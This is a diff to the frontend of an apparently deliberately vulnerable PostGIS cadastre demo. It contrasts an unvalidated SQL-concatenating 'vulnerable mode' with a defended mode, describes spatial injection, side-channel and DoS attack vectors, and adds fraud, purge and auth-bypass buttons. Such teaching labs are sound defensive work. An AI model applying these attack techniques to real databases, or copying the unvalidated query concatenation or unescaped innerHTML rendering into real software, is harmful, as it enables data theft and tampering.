+        v2Title: "2. MBR & GiST Index Poisoning",
+        v2Desc: "Injects diagonal <code>LINESTRING(270000 8660000, 290000 8680000)</code> into <code>&amp;&amp;</code> operator dumping metropolitan cadastre.",
+        v3Title: "3. GEOS Error Side-Channel",
+        v3Desc: "Forces topological exceptions in GEOS C++ engine to infer credentials character by character.",
+        v3SimBtn: "Simulate Blind Inference",
+        v4Title: "4. Algorithmic Buffer DoS O(V²)",
+        v4Desc: "Amplifies <code>quad_segs=192</code> in <code>ST_Buffer</code> + <code>ST_Intersection</code> generating 345,600 vertices in GEOS.",
+        v5Title: "5. GEOMETRYCOLLECTION Coercion (DE-9IM)",
+        v5Desc: "Passes <code>ST_IsValid()=TRUE</code> via degenerate heterogeneous collection reducing parcel area to 0.0 m².",
+        v6Title: "6. Topological Collapse via ST_SnapToGrid",
+        v6Desc: "Injects coarse <code>tolerancia=5000.0</code> m grid collapsing all sector vertices to a single zero-area point.",
+        dmlTitle: "Classic DML / Auth:",
+        btnDmlTamper: "UPDATE Fraud",
+        btnDmlPurge: "DELETE Purge",
+        btnDmlAuth: "Auth Bypass",
         ladmTitle: "Cadastral Integrity (LADM Sample)",
         ladmSub: "Live sample",
         ladmLoading: "Loading cadastral records...",
@@ -892,6 +982,7 @@
         thLadmDni: "ID DOC",
         thLadmTitular: "PARCEL OWNER",
         thLadmAuto: "VALUATION",
+        thLadmAction: "ACTION",
         editorLabel: "Editable SQL Console (Create or modify custom attacks):",
         btnResetSql: "Reset",
         btnClearSql: "Clear",
@@ -911,9 +1002,25 @@
       document.getElementById('btnLangES').className = `segmented-btn ${lang === 'es' ? 'active-lang' : ''}`;
       document.getElementById('btnLangEN').className = `segmented-btn ${lang === 'en' ? 'active-lang' : ''}`;
 
-      // Header
+      // Header & Brand
+      const elBrandTitle = document.getElementById('txtBrandTitle');
+      if (elBrandTitle) elBrandTitle.textContent = t.brandTitle;
+      const elBrandBadge = document.getElementById('txtBrandBadge');
+      if (elBrandBadge) elBrandBadge.textContent = t.brandBadge;
+      
       document.getElementById('lblTagLotes').textContent = t.tagLotes;
       document.getElementById('lblTagTitulares').textContent = t.tagTitulares;
+      
+      const opt487 = document.getElementById('optScale487');
+      if (opt487) opt487.textContent = t.optScale487;
+      const opt5000 = document.getElementById('optScale5000');
+      if (opt5000) opt5000.textContent = t.optScale5000;
+      const opt25000 = document.getElementById('optScale25000');
+      if (opt25000) opt25000.textContent = t.optScale25000;
+      
+      const selScale = document.getElementById('selDatasetScale');
+      if (selScale) selScale.title = t.scaleTitle;
+
       document.getElementById('txtResetDb').textContent = t.resetDb;
       document.getElementById('btnResetDb').title = t.resetDbTitle;
       document.getElementById('txtModeVuln').textContent = t.modeVuln;
@@ -960,6 +1067,10 @@
       document.getElementById('txtMapTitle').textContent = t.mapTitle;
       document.getElementById('btnCenterMap').innerHTML = `<i class="fa-solid fa-expand me-1"></i> ${t.centerBtn}`;
       document.getElementById('txtMapLegend').innerHTML = t.mapLegend;
+      const elCoords = document.getElementById('lblCoords');
+      if (elCoords && (elCoords.textContent.includes('Perú') || elCoords.textContent.includes('Peru'))) {
+        elCoords.textContent = t.coordsLabel;
+      }
 
       // Inspector & Console
       document.getElementById('txtInspectorTitle').textContent = t.inspectorTitle;
@@ -972,18 +1083,45 @@
       document.getElementById('txtCustomPresets').textContent = t.customPresets;
       document.getElementById('txtBtnExecuteCustom').textContent = t.btnExecuteCustom;
       document.getElementById('boxQuery').placeholder = t.editorPlaceholder;
-      document.getElementById('txtMetricDef').textContent = t.metricDef;
 
-      // Threats
+      // Threats Titles & Descriptions (V1 - V6)
       document.getElementById('txtThreatsTitle').textContent = t.threatsTitle;
       document.getElementById('txtThreatsSub').textContent = t.threatsSub;
+      
+      const v1Title = document.getElementById('txtV1Title');
+      if (v1Title) v1Title.textContent = t.v1Title;
       document.getElementById('txtV1Desc').innerHTML = t.v1Desc;
+
+      const v2Title = document.getElementById('txtV2Title');
+      if (v2Title) v2Title.textContent = t.v2Title;
       document.getElementById('txtV2Desc').innerHTML = t.v2Desc;
-      document.getElementById('btnSimBlind').innerHTML = `<i class="fa-solid fa-play me-1"></i> ${t.v2SimBtn}`;
+
+      const v3Title = document.getElementById('txtV3Title');
+      if (v3Title) v3Title.textContent = t.v3Title;
       document.getElementById('txtV3Desc').innerHTML = t.v3Desc;
+      document.getElementById('btnSimBlind').innerHTML = `<i class="fa-solid fa-play me-1"></i> ${t.v3SimBtn}`;
+
+      const v4Title = document.getElementById('txtV4Title');
+      if (v4Title) v4Title.textContent = t.v4Title;
       document.getElementById('txtV4Desc').innerHTML = t.v4Desc;
+
+      const v5Title = document.getElementById('txtV5Title');
+      if (v5Title) v5Title.textContent = t.v5Title;
       document.getElementById('txtV5Desc').innerHTML = t.v5Desc;
+
+      const v6Title = document.getElementById('txtV6Title');
+      if (v6Title) v6Title.textContent = t.v6Title;
       document.getElementById('txtV6Desc').innerHTML = t.v6Desc;
+
+      // DML Classic Buttons
+      const elDmlTitle = document.getElementById('txtDmlTitle');
+      if (elDmlTitle) elDmlTitle.textContent = t.dmlTitle;
+      const elBtnTamper = document.getElementById('btnDmlTamper');
+      if (elBtnTamper) elBtnTamper.textContent = t.btnDmlTamper;
+      const elBtnPurge = document.getElementById('btnDmlPurge');
+      if (elBtnPurge) elBtnPurge.textContent = t.btnDmlPurge;
+      const elBtnAuth = document.getElementById('btnDmlAuth');
+      if (elBtnAuth) elBtnAuth.textContent = t.btnDmlAuth;
 
       // LADM Table
       document.getElementById('txtLadmTitle').textContent = t.ladmTitle;
@@ -992,17 +1130,46 @@
       document.getElementById('thLadmDni').textContent = t.thLadmDni;
       document.getElementById('thLadmTitular').textContent = t.thLadmTitular;
       document.getElementById('thLadmAuto').textContent = t.thLadmAuto;
+      const elThAction = document.getElementById('thLadmAction');
+      if (elThAction) elThAction.textContent = t.thLadmAction;
 
-      // Re-render inspect message
-      if (document.getElementById('boxQuery').textContent.startsWith('-- Selecciona') || document.getElementById('boxQuery').textContent.startsWith('-- Select')) {
-        document.getElementById('boxQuery').textContent = t.inspectorPrompt;
+      // Actualizar botones de acción en ambas tablas
+      document.querySelectorAll('#tblResultadosBusqueda button, #tblTitulares button').forEach(btn => {
+        btn.textContent = lang === 'es' ? 'Ver' : 'View';
+      });
+
+      // Redibujar gráficos auxiliares con el nuevo idioma
+      if (currentActiveVector === 1) drawVector1Graphics();
+      else if (currentActiveVector === 2) drawVector2Graphics();
+      else if (currentActiveVector === 4) drawVector4Graphics();
+      else if (currentActiveVector === 5) drawVector5Graphics();
+      else if (currentActiveVector === 6) drawVector6Graphics();
+
+      // Actualizar badge de pipeline y barrera activa
+      const pipelineBadge = document.getElementById('pipelineStatusBadge');
+      if (pipelineBadge) {
+        if (activeMode === 'vulnerable') {
+          pipelineBadge.textContent = lang === 'es' ? 'MODO VULNERABLE' : 'VULNERABLE MODE';
+        } else {
+          pipelineBadge.textContent = lang === 'es' ? 'DEFENSA ACTIVA (SCIG + ORM)' : 'ACTIVE DEFENSE (SCIG + ORM)';
+        }
+      }
+      const lblActive = document.getElementById('lblActiveBarrier');
+      if (lblActive && (lblActive.textContent === 'Ninguna' || lblActive.textContent === 'None')) {
+        lblActive.textContent = lang === 'es' ? 'Ninguna' : 'None';
+      }
+
+      // Re-render inspect message if standby
+      const boxQ = document.getElementById('boxQuery');
+      if (boxQ && (boxQ.textContent.startsWith('-- Selecciona') || boxQ.textContent.startsWith('-- Select'))) {
+        boxQ.textContent = t.inspectorPrompt;
       }
     }
 
-    // Mapa Leaflet centrado en Puno
+    // Mapa Leaflet centrado en Lima Metropolitana
     const map = L.map('map', {
       zoomControl: true
-    }).setView([-15.840, -70.021], 15);
+    }).setView([-12.0460, -77.0305], 15);
 
     // OpenStreetMap Limpio
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -1012,6 +1179,7 @@
 
     let geojsonLayer = null;
     let baseGeojsonData = null;
+    let currentBounds = null;
     let searchResultItems = [];
 
     map.on('mousemove', function(e) {
@@ -1027,29 +1195,35 @@
       const btnMit = document.getElementById('btnModeMit');
       const pipelineBadge = document.getElementById('pipelineStatusBadge');
 
+      const isSpanish = currentLang === 'es';
+
       if (mode === 'vulnerable') {
         btnVuln.className = 'segmented-btn active-vuln';
         btnMit.className = 'segmented-btn';
-        pipelineBadge.textContent = 'MODO VULNERABLE';
+        pipelineBadge.textContent = isSpanish ? 'MODO VULNERABLE' : 'VULNERABLE MODE';
         pipelineBadge.className = 'badge bg-danger font-mono';
         resetPipelineUI();
       } else {
         btnVuln.className = 'segmented-btn';
         btnMit.className = 'segmented-btn active-mit';
-        pipelineBadge.textContent = 'DEFENSA ACTIVA (3 BARRERAS)';
+        pipelineBadge.textContent = isSpanish ? 'DEFENSA ACTIVA (SCIG + ORM)' : 'ACTIVE DEFENSE (SCIG + ORM)';
         pipelineBadge.className = 'badge bg-success font-mono';
         resetPipelineUI();
       }
       
       setInspectorData(
-        mode === 'vulnerable' ? 'Modo Vulnerable Activo' : 'Modo Protegido Activo',
-        `-- Configuración de entorno actualizada --\nEndpoint Base: ${API_BASE}/${mode}`,
+        mode === 'vulnerable' ? (isSpanish ? 'Modo Vulnerable Activo' : 'Vulnerable Mode Active') : (isSpanish ? 'Modo Protegido (SCIG + ORM) Activo' : 'Protected Mode (SCIG + ORM) Active'),
+        `-- ${isSpanish ? 'Configuración de entorno actualizada' : 'Environment settings updated'} --\n${isSpanish ? 'Endpoint Base' : 'Base Endpoint'}: ${API_BASE}/${mode}`,
         0,
         200,
-        mode === 'vulnerable' ? '⚠️ VULNERABLE' : '🛡️ MITIGADO',
+        mode === 'vulnerable' ? '⚠️ VULNERABLE' : (isSpanish ? '🛡️ MITIGADO (SCIG)' : '🛡️ MITIGATED (SCIG)'),
         mode === 'vulnerable'
-          ? 'Las consultas SQL se concatenan como texto directo sin validación. Cualquier fragmento malicioso será ejecutado por la base de datos.'
-          : 'Se activaron las 3 barreras: validación de entrada (Pydantic), chequeo geométrico en memoria (Shapely) y parámetros preparados (GeoAlchemy2).'
+          ? (isSpanish
+              ? 'Las consultas espaciales se concatenan como texto directo sin validar SRID, MBR, dimensión topológica DE-9IM ni costo geométrico.'
+              : 'Spatial queries are concatenated as raw text without validating SRID, MBR, DE-9IM topological dimension or geometric cost.')
+          : (isSpanish
+              ? 'Guardia SCIG activa: (1) Fijación CRS EPSG:32718 y cota MBR ≤ 10 km², (2) Validación DE-9IM y costo C_geom ≤ 5000 en Shapely, y (3) Enlace binario EWKB con statement_timeout = 2000ms.'
+              : 'SCIG Guard active: (1) CRS Pinning EPSG:32718 & MBR cap ≤ 10 km², (2) DE-9IM validation & C_geom ≤ 5000 in Shapely, and (3) EWKB binary binding with statement_timeout = 2000ms.')
       );
 
       if (typeof updateLiveConcatPreview === 'function') {
@@ -1058,6 +1232,7 @@
     }
 
     function resetPipelineUI() {
+      clearAttackOverlay();
       ['cardBarrier1', 'cardBarrier2', 'cardBarrier3'].forEach(id => {
         document.getElementById(id).className = 'barrier-box';
       });
@@ -1070,7 +1245,7 @@
       
       document.getElementById('arrow1').className = 'fa-solid fa-arrow-right barrier-arrow';
       document.getElementById('arrow2').className = 'fa-solid fa-arrow-right barrier-arrow';
-      document.getElementById('lblActiveBarrier').textContent = 'Ninguna';
+      document.getElementById('lblActiveBarrier').textContent = currentLang === 'es' ? 'Ninguna' : 'None';
     }
 
     function updatePipelineDisplay(b1State, b2State, b3State, activeName = 'Ninguna') {
@@ -1104,13 +1279,23 @@
     // ==========================================
     async function loadStats() {
       try {
-        document.getElementById('lblMapStatus').textContent = 'Cargando...';
+        document.getElementById('lblMapStatus').textContent = currentLang === 'es' ? 'Cargando...' : 'Loading...';
         const res = await fetch(`${API_BASE}/admin/stats`);
         const data = await res.json();
         
-        document.getElementById('lblTotalLotes').textContent = `${data.total_lotes}`;
-        document.getElementById('lblTotalTitulares').textContent = `${data.total_titulares}`;
+        document.getElementById('lblTotalLotes').textContent = Number(data.total_lotes).toLocaleString();
+        document.getElementById('lblTotalTitulares').textContent = Number(data.total_titulares).toLocaleString();
         document.getElementById('dotDb').className = 'status-dot online';
+
+        // Sincronizar el selector de escala para que coincida exactamente con la cantidad en BD
+        const sel = document.getElementById('selDatasetScale');
+        if (sel && data.total_lotes) {
+          sel.value = String(data.total_lotes);
+        }
+
+        if (data.bounds) {
+          currentBounds = data.bounds;
+        }
 
         // Renderizar tabla titulares
         const tbody = document.getElementById('tblTitulares');
@@ -1125,6 +1310,7 @@
               <td class="text-secondary">${t.dni}</td>
               <td class="${isHacked ? 'text-danger fw-bold' : ''}">${t.titular}</td>
               <td class="${isZero ? 'text-danger fw-bold' : 'text-success'}">S/ ${Number(t.autovaluo).toFixed(2)}</td>
+              <td><button class="btn btn-xs btn-outline-primary py-0 px-2 font-mono" onclick="focusLadmParcel('${t.id_lote}')">${currentLang === 'es' ? 'Ver' : 'View'}</button></td>
             `;
             tbody.appendChild(tr);
           });
@@ -1141,7 +1327,7 @@
             geojsonLayer = null;
           }
         }
-        document.getElementById('lblMapStatus').textContent = 'Activo';
+        document.getElementById('lblMapStatus').textContent = currentLang === 'es' ? 'Activo' : 'Active';
       } catch (err) {
         console.error("Error cargando catastro:", err);
         document.getElementById('lblMapStatus').textContent = 'Error';
@@ -1167,15 +1353,16 @@
         },
         onEachFeature: function(feature, layer) {
           const p = feature.properties || {};
+          const isSpanish = currentLang === 'es';
           const popupContent = `
             <div style="font-family: var(--font-ui); font-size: 12px; min-width: 170px; padding: 2px;">
               <div style="font-weight: 700; color: #0284c7; border-bottom: 1px solid #e2e8f0; padding-bottom: 3px; margin-bottom: 4px;">
-                LOTE: ${p.id_lote || 'N/A'}
+                ${isSpanish ? 'LOTE' : 'PARCEL'}: ${p.id_lote || 'N/A'}
               </div>
-              <div><strong>Sector:</strong> ${p.sector || p.cod_sector || 'N/A'}</div>
-              <div><strong>Zonificación:</strong> ${p.tipo_suelo || 'Urbano'}</div>
-              <div><strong>Titular:</strong> ${p.titular || 'N/A'}</div>
-              <div><strong>Autovalúo:</strong> S/ ${(p.autovaluo !== undefined ? Number(p.autovaluo).toLocaleString('es-PE', {minimumFractionDigits: 2}) : '0.00')}</div>
+              <div><strong>${isSpanish ? 'Sector' : 'Sector'}:</strong> ${p.sector || p.cod_sector || 'N/A'}</div>
+              <div><strong>${isSpanish ? 'Zonificación' : 'Zoning'}:</strong> ${p.tipo_suelo || (isSpanish ? 'Urbano' : 'Urban')}</div>
+              <div><strong>${isSpanish ? 'Titular' : 'Owner'}:</strong> ${p.titular || 'N/A'}</div>
+              <div><strong>${isSpanish ? 'Autovalúo' : 'Valuation'}:</strong> S/ ${(p.autovaluo !== undefined ? Number(p.autovaluo).toLocaleString('es-PE', {minimumFractionDigits: 2}) : '0.00')}</div>
             </div>
           `;
           layer.bindPopup(popupContent);
@@ -1188,6 +1375,14 @@
     }
 
     function fitCatastroBounds() {
+      if (currentBounds && currentBounds[0] && currentBounds[0][0] !== null) {
+        try {
+          map.fitBounds(currentBounds, { padding: [25, 25] });
+          return;
+        } catch (e) {
+          console.warn("No se pudieron calcular límites desde currentBounds:", e);
+        }
+      }
       if (geojsonLayer) {
         try {
           const bounds = geojsonLayer.getBounds();
@@ -1200,7 +1395,227 @@
       }
     }
 
-    function highlightParcels(predios, color = '#dc2626') {
+    let attackOverlayLayer = null;
+    let attackAuxGraphicsLayer = null;
+    let focusHighlightLayer = null;
+    let currentActiveVector = null;
+
+    function clearAttackAuxGraphics() {
+      if (attackAuxGraphicsLayer) {
+        map.removeLayer(attackAuxGraphicsLayer);
+        attackAuxGraphicsLayer = null;
+      }
+    }
+
+    function clearFocusHighlight() {
+      if (focusHighlightLayer) {
+        map.removeLayer(focusHighlightLayer);
+        focusHighlightLayer = null;
+      }
+    }
+
+    function clearAttackOverlay() {
+      if (attackOverlayLayer) {
+        map.removeLayer(attackOverlayLayer);
+        attackOverlayLayer = null;
+      }
+      clearAttackAuxGraphics();
+      clearFocusHighlight();
+      currentActiveVector = null;
+    }
+
+    function drawVector1Graphics() {
+      clearAttackAuxGraphics();
+      attackAuxGraphicsLayer = L.layerGroup().addTo(map);
+      const isSpanish = currentLang === 'es';
+      const centerPt = [-12.046001, -77.030497];
+
+      // Círculo del radio legal autorizado (50 metros)
+      const authCircle = L.circle(centerPt, {
+        radius: 50,
+        color: '#059669',
+        fillColor: '#10b981',
+        fillOpacity: 0.35,
+        weight: 3,
+        dashArray: '6, 6'
+      }).bindTooltip(
+        isSpanish ? "🛡️ Radio Autorizado: 50 m" : "🛡️ Authorized Radius: 50 m", 
+        { permanent: true, direction: 'top', className: 'map-badge-green' }
+      );
+
+      // Marcador central del punto de consulta ST_DWithin
+      const centerMarker = L.circleMarker(centerPt, {
+        radius: 8,
+        color: '#064e3b',
+        fillColor: '#34d399',
+        fillOpacity: 1,
+        weight: 2
+      }).bindPopup(`
+        <div style="font-family: var(--font-ui); font-size: 12px; padding: 2px;">
+          <strong style="color: #059669;">📍 ${isSpanish ? 'Centro de Consulta ST_DWithin' : 'ST_DWithin Query Center'}</strong><br>
+          <strong>X:</strong> 278,957 | <strong>Y:</strong> 8,667,542 (EPSG:32718)<br>
+          <strong>${isSpanish ? 'Radio Legal' : 'Legal Radius'}:</strong> 50 m<br>
+          <span class="text-danger fw-bold">${isSpanish ? '¡Lotes rojos fuera del círculo son exfiltrados!' : 'Red parcels outside circle are exfiltrated!'}</span>
+        </div>
+      `);
+
+      attackAuxGraphicsLayer.addLayer(authCircle);
+      attackAuxGraphicsLayer.addLayer(centerMarker);
+      centerMarker.openPopup();
+    }
+
+    function drawVector2Graphics() {
+      clearAttackAuxGraphics();
+      attackAuxGraphicsLayer = L.layerGroup().addTo(map);
+      const isSpanish = currentLang === 'es';
+
+      // 1. Polígono MBR gigante de 400 km2
+      const mbrPolygon = L.polygon([
+        [-12.113548, -77.113272],
+        [-11.932804, -77.111861],
+        [-11.934123, -76.928297],
+        [-12.114887, -76.929586]
+      ], {
+        color: '#d97706',
+        fillColor: '#fbbf24',
+        fillOpacity: 0.15,
+        weight: 3,
+        dashArray: '6, 6'
+      }).bindTooltip(
+        isSpanish ? "📦 MBR Envolvente GiST: 20 km × 20 km (400 km²)" : "📦 GiST MBR Envelope: 20 km × 20 km (400 km²)",
+        { permanent: true, direction: 'center', className: 'map-badge-orange' }
+      );
+
+      // 2. Línea diagonal inyectada (LINESTRING)
+      const lineLayer = L.polyline([[-12.113548, -77.113272], [-11.934123, -76.928297]], {
+        color: '#dc2626',
+        weight: 4,
+        dashArray: '8, 8'
+      }).bindTooltip(
+        isSpanish ? "⚠️ LINESTRING Inyectado (1D, Área = 0 m²)" : "⚠️ Injected LINESTRING (1D, Area = 0 m²)",
+        { permanent: true, direction: 'top', className: 'map-badge-orange' }
+      );
+
+      attackAuxGraphicsLayer.addLayer(mbrPolygon);
+      attackAuxGraphicsLayer.addLayer(lineLayer);
+    }
+
+    function drawVector4Graphics() {
+      clearAttackAuxGraphics();
+      attackAuxGraphicsLayer = L.layerGroup().addTo(map);
+      const isSpanish = currentLang === 'es';
+      const centerPt = [-12.046001, -77.030497];
+
+      const dosCircle = L.circle(centerPt, {
+        radius: 2500,
+        color: '#7c3aed',
+        fillColor: '#a78bfa',
+        fillOpacity: 0.20,
+        weight: 3,
+        dashArray: '8, 8'
+      }).bindTooltip(
+        isSpanish ? "💥 Expansión ST_Buffer: Radio 2,500 m (quad_segs=192 → 345,600 vértices GEOS)" : "💥 ST_Buffer Expansion: Radius 2,500 m (quad_segs=192 → 345,600 GEOS vertices)",
+        { permanent: true, direction: 'top', className: 'map-badge-purple' }
+      );
+
+      attackAuxGraphicsLayer.addLayer(dosCircle);
+    }
+
+    function drawVector5Graphics() {
+      clearAttackAuxGraphics();
+      attackAuxGraphicsLayer = L.layerGroup().addTo(map);
+      const isSpanish = currentLang === 'es';
+
+      const pt = [-12.046001, -77.030497];
+      const lineEnd = [-12.045550, -77.030040];
+
+      const marker = L.circleMarker(pt, {
+        radius: 9,
+        color: '#b91c1c',
+        fillColor: '#ef4444',
+        fillOpacity: 1,
+        weight: 2
+      }).bindTooltip(
+        isSpanish ? "📍 POINT(278957 8667542)" : "📍 POINT(278957 8667542)",
+        { permanent: true, direction: 'left', className: 'map-badge-orange' }
+      );
+
+      const line = L.polyline([pt, lineEnd], {
+        color: '#e11d48',
+        weight: 5,
+        dashArray: '4, 4'
+      }).bindTooltip(
+        isSpanish ? "📏 LINESTRING Inyectado (Área = 0.0 m²)" : "📏 Injected LINESTRING (Area = 0.0 m²)",
+        { permanent: true, direction: 'right', className: 'map-badge-orange' }
+      );
+
+      attackAuxGraphicsLayer.addLayer(marker);
+      attackAuxGraphicsLayer.addLayer(line);
+    }
+
+    function drawVector6Graphics() {
+      clearAttackAuxGraphics();
+      attackAuxGraphicsLayer = L.layerGroup().addTo(map);
+      const isSpanish = currentLang === 'es';
+      const centerPt = [-12.046001, -77.030497];
+
+      const gridCircle = L.circle(centerPt, {
+        radius: 5000,
+        color: '#c2410c',
+        fillColor: '#fb923c',
+        fillOpacity: 0.16,
+        weight: 3,
+        dashArray: '10, 10'
+      }).bindTooltip(
+        isSpanish ? "🌀 ST_SnapToGrid: Tolerancia 5,000 m (Colapso a un nodo)" : "🌀 ST_SnapToGrid: Tolerance 5,000 m (Collapse to single node)",
+        { permanent: true, direction: 'top', className: 'map-badge-orange' }
+      );
+
+      const collapsedNode = L.circleMarker(centerPt, {
+        radius: 10,
+        color: '#7c2d12',
+        fillColor: '#ea580c',
+        fillOpacity: 1,
+        weight: 3
+      }).bindPopup(`<strong>${isSpanish ? 'Nodo de Colapso Topológico' : 'Topological Collapse Node'}</strong><br>${isSpanish ? 'Todos los lotes del sector 0101 se fusionaron a este punto con Área = 0.0 m²' : 'All sector 0101 parcels snapped to this point with Area = 0.0 m²'}`);
+
+      attackAuxGraphicsLayer.addLayer(gridCircle);
+      attackAuxGraphicsLayer.addLayer(collapsedNode);
+      collapsedNode.openPopup();
+    }
+
+
+    function displayParcelsInTableAndMap(predios, color = '#dc2626', title = '', isCompromised = true) {
+      if (!predios || predios.length === 0) return;
+
+      searchResultItems = predios;
+      const count = predios.length;
+
+      // 1. POBLAR TABLA DE RESULTADOS INMEDIATAMENTE
+      const divResultados = document.getElementById('divResultadosBusqueda');
+      const tbody = document.getElementById('tblResultadosBusqueda');
+      if (divResultados && tbody) {
+        tbody.innerHTML = '';
+        divResultados.className = 'd-block mt-2 pt-2 border-top';
+
+        predios.forEach((p, idx) => {
+          const tr = document.createElement('tr');
+          const isHacked = isCompromised || (p.titular && (p.titular.includes('HACKER') || p.titular.includes('admin') || (p.tipo_suelo && p.tipo_suelo.includes('COERCIÓN'))));
+          const isZero = p.autovaluo === 0 || p.area_grafica === 0;
+          tr.innerHTML = `
+            <td><code>${p.id_lote || '-'}</code></td>
+            <td><span class="badge ${isCompromised ? 'bg-danger text-white' : 'bg-light text-dark border'}">${p.cod_sector || '0101'}</span></td>
+            <td class="${isHacked ? 'text-danger fw-bold' : ''}">${p.titular || 'N/A'}</td>
+            <td class="${isZero ? 'text-danger fw-bold' : 'text-success'}">S/ ${Number(p.autovaluo || 0).toFixed(2)}</td>
+            <td><button class="btn btn-xs btn-outline-danger py-0 px-2 font-mono" onclick="focusParcel(${idx})">${currentLang === 'es' ? 'Ver' : 'View'}</button></td>
+          `;
+          tbody.appendChild(tr);
+        });
+      }
+
+      // 2. RENDERIZAR POLÍGONOS EN EL MAPA (SUPERPUESTOS EN ROJO BRILLANTE)
+      clearAttackOverlay();
+
       const features = [];
       predios.forEach(p => {
         if (p.geojson) {
@@ -1213,18 +1628,59 @@
                 sector: p.cod_sector,
                 tipo_suelo: p.tipo_suelo,
                 titular: p.titular || 'N/A',
-                autovaluo: p.autovaluo || 0.0
+                autovaluo: p.autovaluo || 0.0,
+                area_m2: p.area_grafica || 0.0
               },
               geometry: g
             });
-          } catch (e) {
+          } catch(e) {
             console.error("Error parseando geojson:", e);
           }
         }
       });
+
       if (features.length > 0) {
-        renderGeojsonOnMap({ type: "FeatureCollection", features: features }, color, true);
+        attackOverlayLayer = L.geoJSON({ type: "FeatureCollection", features: features }, {
+          style: function() {
+            return {
+              color: color,
+              weight: 3,
+              fillColor: color,
+              fillOpacity: 0.65
+            };
+          },
+          onEachFeature: function(feature, layer) {
+            const pr = feature.properties || {};
+            const isSpanish = currentLang === 'es';
+            const popupContent = `
+              <div style="font-family: var(--font-ui); font-size: 12px; min-width: 190px; padding: 2px;">
+                <div style="font-weight: 700; color: #dc2626; border-bottom: 1px solid #fecaca; padding-bottom: 3px; margin-bottom: 4px;">
+                  ⚠️ ${isSpanish ? 'LOTE COMPROMETIDO' : 'COMPROMISED PARCEL'}: ${pr.id_lote || 'N/A'}
+                </div>
+                <div><strong>${isSpanish ? 'Sector' : 'Sector'}:</strong> ${pr.sector || 'N/A'}</div>
+                <div><strong>${isSpanish ? 'Zonificación' : 'Zoning'}:</strong> ${pr.tipo_suelo || 'N/A'}</div>
+                <div><strong>${isSpanish ? 'Titular' : 'Owner'}:</strong> ${pr.titular || 'N/A'}</div>
+                <div><strong>${isSpanish ? 'Autovalúo' : 'Valuation'}:</strong> S/ ${Number(pr.autovaluo || 0).toLocaleString('es-PE', {minimumFractionDigits: 2})}</div>
+                <div><strong>${isSpanish ? 'Área' : 'Area'}:</strong> ${Number(pr.area_m2 || 0).toFixed(2)} m²</div>
+              </div>
+            `;
+            layer.bindPopup(popupContent);
+          }
+        }).addTo(map);
+
+        try {
+          const bounds = attackOverlayLayer.getBounds();
+          if (bounds.isValid()) {
+            map.fitBounds(bounds, { padding: [40, 40], maxZoom: 18 });
+          }
+        } catch(e) {
+          console.warn("No se pudo enfocar capa de ataque:", e);
+        }
       }
+    }
+
+    function highlightParcels(predios, color = '#dc2626') {
+      displayParcelsInTableAndMap(predios, color, 'Lotes Afectados', true);
     }
 
     // ==========================================
@@ -1366,12 +1822,13 @@
 
     async function ejecutarBusquedaLotes() {
       const criterio = document.getElementById('inputCriterio').value.trim();
+      const isSpanish = currentLang === 'es';
       if (!criterio) {
-        alert("Ingresa un ID, titular o payload para evaluar.");
+        alert(isSpanish ? "Ingresa un ID, titular o payload para evaluar." : "Enter a parcel ID, owner name, or payload to evaluate.");
         return;
       }
 
-      setLoadingState(`Evaluando criterio "${criterio}" en modo ${activeMode.toUpperCase()}...`);
+      setLoadingState(isSpanish ? `Evaluando criterio "${criterio}" en modo ${activeMode.toUpperCase()}...` : `Evaluating criteria "${criterio}" in ${activeMode.toUpperCase()} mode...`);
       const start = performance.now();
       const url = `${API_BASE}/${activeMode}/predios/buscar?criterio=${encodeURIComponent(criterio)}`;
 
@@ -1398,7 +1855,7 @@
                 <td><span class="badge bg-light text-dark border">${p.cod_sector || '-'}</span></td>
                 <td class="${isExfil ? 'text-danger fw-bold' : ''}">${p.titular}</td>
                 <td>S/ ${Number(p.autovaluo).toFixed(2)}</td>
-                <td><button class="btn btn-xs btn-outline-primary py-0 px-2 font-mono" onclick="focusParcel(${idx})">Ver</button></td>
+                <td><button class="btn btn-xs btn-outline-primary py-0 px-2 font-mono" onclick="focusParcel(${idx})">${isSpanish ? 'Ver' : 'View'}</button></td>
               `;
               tbody.appendChild(tr);
             });
@@ -1406,7 +1863,7 @@
             highlightParcels(searchResultItems, activeMode === 'vulnerable' && count > 1 ? '#dc2626' : '#16a34a');
           } else {
             divResultados.className = 'd-block mt-2 pt-2 border-top';
-            tbody.innerHTML = '<tr><td colspan="5" class="text-center text-muted py-2">No se encontraron lotes para este criterio.</td></tr>';
+            tbody.innerHTML = `<tr><td colspan="5" class="text-center text-muted py-2">${isSpanish ? 'No se encontraron lotes para este criterio.' : 'No parcels found matching this criteria.'}</td></tr>`;
           }
 
           if (activeMode === 'vulnerable') {
@@ -1414,63 +1871,71 @@
               updatePipelineDisplay(
                 { state: 'bypassed', label: 'BYPASS' },
                 { state: 'bypassed', label: 'N/A' },
-                { state: 'bypassed', label: 'SQLI INYECTADO' },
-                'Ninguna (Vulnerable)'
+                { state: 'bypassed', label: isSpanish ? 'SQLI INYECTADO' : 'SQLI INJECTED' },
+                isSpanish ? 'Ninguna (Vulnerable)' : 'None (Vulnerable)'
               );
               setInspectorData(
-                'Búsqueda Vulnerable (Inyección Exitosa)',
+                isSpanish ? 'Búsqueda Vulnerable (Inyección Exitosa)' : 'Vulnerable Search (Successful Injection)',
                 json.query_debug,
                 duration,
                 res.status,
-                '⚠️ EXFILTRACIÓN',
-                `Se cerró la comilla del filtro e inyectó una condición verdadera. La base de datos ignoró el criterio y devolvió ${count} predios sin restricción.`
+                isSpanish ? '⚠️ EXFILTRACIÓN' : '⚠️ EXFILTRATION',
+                isSpanish
+                  ? `Se cerró la comilla del filtro e inyectó una condición verdadera. La base de datos ignoró el criterio y devolvió ${count} predios sin restricción.`
+                  : `Filter quote closed prematurely and true condition injected. Database ignored criteria and returned ${count} unrestricted parcels.`
               );
             } else {
               updatePipelineDisplay(
                 { state: 'bypassed', label: 'BYPASS' },
                 { state: 'bypassed', label: 'N/A' },
-                { state: 'passed', label: 'EJECUTADO' },
-                'Ninguna (SQL Dinámico)'
+                { state: 'passed', label: isSpanish ? 'EJECUTADO' : 'EXECUTED' },
+                isSpanish ? 'Ninguna (SQL Dinámico)' : 'None (Dynamic SQL)'
               );
               setInspectorData(
-                'Búsqueda Normal (1 Predio)',
+                isSpanish ? 'Búsqueda Normal (1 Predio)' : 'Normal Search (1 Parcel)',
                 json.query_debug,
                 duration,
                 res.status,
-                'INFORMACIÓN',
